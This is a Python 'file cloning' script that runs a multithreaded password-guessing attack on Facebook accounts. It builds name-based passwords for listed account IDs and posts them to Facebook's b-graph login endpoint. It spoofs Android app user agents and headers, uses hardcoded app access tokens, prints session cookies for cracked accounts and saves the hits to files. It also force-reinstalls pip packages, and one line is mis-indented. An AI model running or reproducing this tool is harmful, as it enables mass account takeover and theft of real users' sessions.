#Coded by HANNAN . Modified by SIAM AHMED 

import os,time,random,re,sys,string, subprocess

from concurrent.futures import ThreadPoolExecutor as tpe



try:

 import time,json,uuid,requests

except:

 os.system("pip install requests")
 
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')



		
ugen=[]
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='SM-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,115)
    i='0'
    j=random.randrange(4200,6000)
    k=random.randrange(40,200)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def morshed3():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(kkkkki)+';FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
       return ua





    

    

       




idss = []

pp = []

oku = []

cpu = []

l = []

idx = []

loop = 0



def oo(t):

  return '\033[1;37m['+str(t)+']\033[1;37m '



W = '\x1b[1;97m'

G = '\x1b[1;92m'

R = '\x1b[1;91m'

S = '\x1b[1;96m'

B = '\x1b[1;94m'

Y = '\x1b[1;93m'

P = '\x1b[1;95m'



logo=(f"""\u001b[1;96m

{W} /$$   /$$ /$$   /$$ /$$      
{G} | $$$ | $$| $$  / $$| $$      
{R} | $$$$| $$|  $$/ $$/| $$      
{S} | $$ $$ $$ \  $$$$/ | $$      
{B} | $$  $$$$  >$$  $$ | $$      
{Y} | $$\  $$$ /$$/\  $$| $$      
{P} | $$ \  $$| $$  \ $$| $$$$$$$$
{G} |__/  \__/|__/  |__/|________/
                             
                              \u001b[0;1m

Coded by Abdul Hannan Ansari

Modified by SIAM AHMED

""")



def clear():

   os.system('clear')

   print(logo);lin3()



def lin3():

   print('\33[1;37m---------------------------------')

def exit():

  sys.exit()



def main_menu():

    os.system("clear")

    print(logo);lin3()

    print(f"{oo(1)}File Cloning ")   

    print(f"{oo(0)}Exit")

    lin3()

    cp =input('[?] Choice : ')

    if cp=="1":file()

    if cp == "0":

     exit()

    main_menu()

     

def file():

    os.system("clear")

    print(logo);lin3()

    file = input(f"{oo('-')}Enter File: ")

    try:

        for x in open(file,'r').readlines():

            idx.append(x.strip())

    except:

        print(f"{oo('!')}File Not Found");time.sleep(1)

        main_menu() 

    method()

    exit()







"""

------Access Token------

Access Tokens. Change if necessary.



Ads Manager Android : 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28

Facebook Android : 350685531728|62f8ce9f74b12f84c123cc23437a4a32

Facebook iPhone : 6628568379|c1e620fa708a1d5696fb991c1bde5662

Ads Manager App for iOS : 1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae



--------URL and Host--------

Graph : https://graph.facebook.com/auth/login/

B-Graph : https://b-graph.facebook.com/auth/login

"""





def method():

    clear()

    

    lp = input(f'{oo("?")}Limit Passwords? : ')

    if lp.isnumeric():

        pp=[]

        clear()

        ex = 'firstlast first123 last123'

        print(f'{oo("+")}{ex} (ETC)')

        lin3()

        for x in range(int(lp)):

           pp.append(input(f'{oo(x+1)}Password : '))

    else:

       print(f"{oo('!')}Numeric Only");time.sleep(0.8)

       main_menu()

    clear() 

    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))

    print(f'\x1b[1;97m[✓] Dont Use Airplane mOde ;)')

    lin3()

    def start(user):

     try:

        global loop,idx,cll

        r = requests.Session()

        user = user.strip()

        acc, name = user.split("|")

        first = name.rsplit(" ")[0]

        try:

            last = name.rsplit(" ")[1]

        except:

            last = first

        pers = str(int(loop)/int(len(idx)) * 100)[:4]

        sys.stdout.write(f'\r {R}[{W}HANNAN{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')

        sys.stdout.flush()

        loop+=1

        for pswd in pp:

              heads= None#Put Your user Agent Here

              pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())

              header = {

    "Content-Type": "application/x-www-form-accencoded",
    "Host": "graph.facebook.com",
    "User-Agent": morshed3(),
    "X-FB-Net-HNI": "45204",
    "X-FB-SIM-HNI": "45201",
    "X-FB-Connection-Type": "unknown",
    "X-Tigon-Is-Retry": "False",
    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
    "x-fb-device-group": "5120",
    "X-FB-Friendly-Name": "ViewerReactionsMutation",
    "X-FB-Request-Analytics-Tags": "graphservice",
    "Accept-Encoding": "gzip, deflate",
    "X-FB-HTTP-Engine": "Liger",
    "X-FB-Client-IP": "True",
    "X-FB-Server-Cluster": "True",
    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
    "Connection": "Keep-Alive",
              }


              data={

    "adid": str(uuid.uuid4()),

    "format": "json",

    "device_id": str(uuid.uuid4()),

    "cpl": "true",

    "family_device_id": str(uuid.uuid4()),

    "credentials_type": "device_based_login_password",

    "error_detail_type": "button_with_disabled",

    "source": "device_based_login",

    "email": acc,

    "password": pswd,

    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",

    "generate_session_cookies": "1",

    "meta_inf_fbmeta": "",

    "advertiser_id": str(uuid.uuid4()),

    "currently_logged_in_userid": "0",

    "locale": "en_US",

    "client_country_code": "US",

    "method": "auth.login",

    "fb_api_req_friendly_name": "authenticate",

    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",

    "api_key": "882a8490361da98702bf97a021ddc14d",

              }



              response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False).text

              if "session_key" in response:

                 oku.append(acc)

                 cookie=f"sb={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(response)["session_cookies"])

                 print('\033[1;32m[OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)

                 print(" [Cookie] ",cookie)

                 open('/sdcard/FXF-Ok.txt','a').write(f'{acc}|{pswd}\n')

                 break

              elif "User must verify their account" in response:

                cpu.append(acc)

                print('\033[1;33m[CP] \033[1;33m'+acc+' \033[1;33m|\033[1;33m '+pswd)

                open('/sdcard/FXF-CP.txt','a').write(f'{acc}|{pswd}\n')

                break

              else:

                   continue   

     except Exception as e:

       time.sleep(10)

    with tpe(max_workers=30) as tp:

            tp.map(start,idx)

    exit()    
    
    





main_menu()